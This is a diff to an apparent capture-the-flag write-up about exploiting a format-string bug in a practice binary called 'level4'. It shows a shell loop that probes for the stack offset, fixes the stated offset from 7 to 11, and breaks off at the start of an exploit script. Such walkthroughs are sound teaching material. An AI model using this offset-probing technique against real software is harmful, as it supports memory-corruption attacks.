@@ -55,7 +55,7 @@ for i in $(seq 1 40); do
   python -c "print('AAAA' + ' %%%d\$x' % $i)" | ./level4
 done
 ```
-Look for 41414141 in the output. appears at %11$x, that means the offset is 7.
+Look for 41414141 in the output. appears at %11$x, that means the offset is 11.
 ## Step 3: Exploit Script (Python)
 ```
 import struct
